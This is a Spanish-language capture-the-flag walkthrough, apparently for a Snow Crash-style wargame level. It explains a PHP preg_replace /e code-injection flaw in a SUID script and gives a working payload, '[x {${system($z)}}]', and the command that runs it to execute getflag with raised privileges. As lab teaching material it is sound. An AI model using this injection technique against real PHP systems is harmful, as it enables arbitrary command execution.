<h1 align="center">Level 05 Walkthrough ~ PHP eval injection:</h1>

Al llegar a este nivel veo que en mi home encuentro unos ficheros llamados `level06` con permisos SUID y `level06.php`, este fichero es un script 
PHP con el siguiente contenido:
```php
#!/usr/bin/php

<?php
function y($m){
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}

function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a);
    return $a;
}

$r = x($argv[1], $argv[2]);

print $r;

?>
```

Este script recibe dos argumentos, a uno de ellos se le aplican varios filtros:
- Se espera que dentro de $y exista una sintaxis semejante a `[x ]` y el contenido
dentro de este será introducido en la función `y()`.
- En la función `y()` se le aplica al texto una sustitución en cada `.` en ` x `.
- Después se sustituyen los `@` por ` y`.

**IMPORTANTE**:

Tras esos filtros podemos apreciar un `/e` que es una función de PHP que evalua el 
resultado de una expresión regular bastante peligrosa y actualmente deprecada que me 
permite que interprete el resultado de la expresión regular como código PHP.
Por lo que creo un fichero /tmp/test.php donde guardo el siguiente código:

```txt
[x {${system($z)}}]
```
> system es una función de PHP que nos permite ejecutar comándos en el sistema y lo envolvemos
> en esos `{${}}` para que lo detecte como declaración de una expresión regular compleja y pase a
> ser evaluada/ejecutada por `/e`.

y ejecuto:

```bash
./level06 /tmp/test.php getflag 2>/dev/null
```
Consigo la flag, entro en flag06, ejecuto `getflag` y paso al [siguiente nivel](../../level07/resources/README.md).
